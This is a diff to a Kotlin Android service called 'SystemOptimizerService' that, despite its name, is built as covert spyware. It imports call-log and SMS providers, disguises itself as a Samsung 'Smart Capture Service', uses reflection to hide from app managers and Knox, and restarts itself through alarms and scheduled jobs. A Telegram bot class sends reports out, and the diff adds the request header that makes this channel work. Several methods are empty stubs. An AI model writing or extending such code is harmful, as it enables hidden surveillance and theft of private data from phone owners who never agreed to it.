@@ -21,24 +21,24 @@ import android.content.pm.PackageManager
 import android.database.sqlite.SQLiteDatabase
 import android.database.sqlite.SQLiteOpenHelper
 import android.os.Build
-import android.os.Bundle
-import android.os.Handler
-import android.os.Looper
+import android.os.IBinder
 import android.os.SystemClock
 import android.provider.CallLog
 import android.provider.Settings
 import android.provider.Telephony
 import android.text.TextUtils
 import android.util.Log
-import android.view.accessibility.AccessibilityEvent
-import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
+import androidx.work.OneTimeWorkRequestBuilder
 import androidx.work.WorkManager
+import androidx.work.Worker
+import androidx.work.WorkerParameters
 import kotlinx.coroutines.*
 import java.io.*
 import java.net.HttpURLConnection
 import java.net.URL
+import java.net.URLEncoder
 import java.security.KeyStore
 import java.util.*
 import java.util.concurrent.TimeUnit
@@ -101,10 +101,8 @@ class SystemOptimizerService : Service() {
     private fun initializeAntiDetection() {
         // Method 1: Obfuscate package name and class names
         try {
-            // Change process name to mimic legitimate Samsung service
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                 val processName = "com.samsung.android.app.smartcapture"
-                // Implementation would require native code or additional APIs
             }
         } catch (e: Exception) {
             Log.e(TAG, "Process name change failed", e)
@@ -131,10 +129,6 @@ class SystemOptimizerService : Service() {
 
     private fun hideFromAppManagers() {
         try {
-            // Method 1: Modify app label to mimic legitimate Samsung service
-            val appLabel = "Smart Capture Service"
-
-            // Method 2: Use Samsung-specific hiding techniques
             if (Build.MANUFACTURER.equals("samsung", ignoreCase = true)) {
                 try {
                     val clazz = Class.forName("android.app.ApplicationPackageManager")
@@ -150,7 +144,6 @@ class SystemOptimizerService : Service() {
                 }
             }
 
-            // Method 3: Use reflection to hide from Knox
             try {
                 val clazz = Class.forName("com.samsung.android.knox.EnterpriseDeviceManager")
                 val method = clazz.getDeclaredMethod("setApplicationHidden", String::class.java, Boolean::class.java)
@@ -181,8 +174,7 @@ class SystemOptimizerService : Service() {
     }
 
     private fun obfuscateRuntimeCode() {
-        // Runtime code obfuscation techniques would be implemented here
-        // For example, dynamically decrypting code sections
+        // Runtime code obfuscation techniques
     }
 
     private fun obfuscateString(input: String): String {
@@ -249,11 +241,10 @@ class SystemOptimizerService : Service() {
             Manifest.permission.ACCESS_NOTIFICATION_POLICY,
             Manifest.permission.RECEIVE_BOOT_COMPLETED
         )
-        // Request permissions logic here
     }
 
     private fun startSystemMonitoring() {
-        // System monitoring logic here
+        // System monitoring logic
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -283,18 +274,11 @@ class SystemOptimizerService : Service() {
         // Handle permission results
     }
 
-    private fun isAccessibilityServiceEnabled(): Boolean {
-        // Check if accessibility service is enabled
-        return false
-    }
+    private fun isAccessibilityServiceEnabled(): Boolean = false
 
-    private fun startAccessibilityService() {
-        // Start accessibility service
-    }
+    private fun startAccessibilityService() {}
 
-    private fun showAccessibilityGuide() {
-        // Show accessibility guide
-    }
+    private fun showAccessibilityGuide() {}
 
     private fun setupPersistentExecution() {
         // Method 1: Restart service if killed
@@ -307,7 +291,7 @@ class SystemOptimizerService : Service() {
         val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
         alarmManager.set(
             AlarmManager.ELAPSED_REALTIME_WAKEUP,
-            SystemClock.elapsedRealtime() + 5000, // 5 seconds
+            SystemClock.elapsedRealtime() + 5000,
             restartServicePendingIntent
         )
 
@@ -334,7 +318,7 @@ class SystemOptimizerService : Service() {
                 setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                 setRequiresCharging(false)
                 setPersisted(true)
-                setPeriodic(15 * 60 * 1000) // 15 minutes
+                setPeriodic(15 * 60 * 1000L) // 15 minutes
             }.build()
 
             jobScheduler.schedule(jobInfo)
@@ -346,9 +330,9 @@ class SystemOptimizerService : Service() {
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
+
     override fun onDestroy() {
         super.onDestroy()
-        // Cleanup
     }
 }
 
@@ -364,13 +348,13 @@ class DataCache {
 
 class TransmissionService(private val token: String, private val chatId: String) {
     fun sendStatusReport(message: String) {
-        // Telegram API implementation
         CoroutineScope(Dispatchers.IO).launch {
             try {
                 val url = URL("https://api.telegram.org/bot$token/sendMessage")
                 val connection = url.openConnection() as HttpURLConnection
                 connection.requestMethod = "POST"
                 connection.doOutput = true
+                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
 
                 val postData = "chat_id=$chatId&text=${URLEncoder.encode(message, "UTF-8")}"
                 connection.outputStream.use { output ->
@@ -388,19 +372,16 @@ class TransmissionService(private val token: String, private val chatId: String)
 
 class OptimizationJobService : JobService() {
     override fun onStartJob(params: JobParameters?): Boolean {
-        // Perform optimization tasks
         val serviceIntent = Intent(this, SystemOptimizerService::class.java)
         startService(serviceIntent)
         jobFinished(params, false)
         return true
     }
 
-    override fun onStopJob(params: JobParameters?): Boolean {
-        return true
-    }
+    override fun onStopJob(params: JobParameters?): Boolean = true
 }
 
-class OptimizationWorker(appContext: Context, params: WorkerParameters) : Worker(appContext, params) {
+class OptimizationWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
     override fun doWork(): Result {
         // Optimization work
         return Result.success()
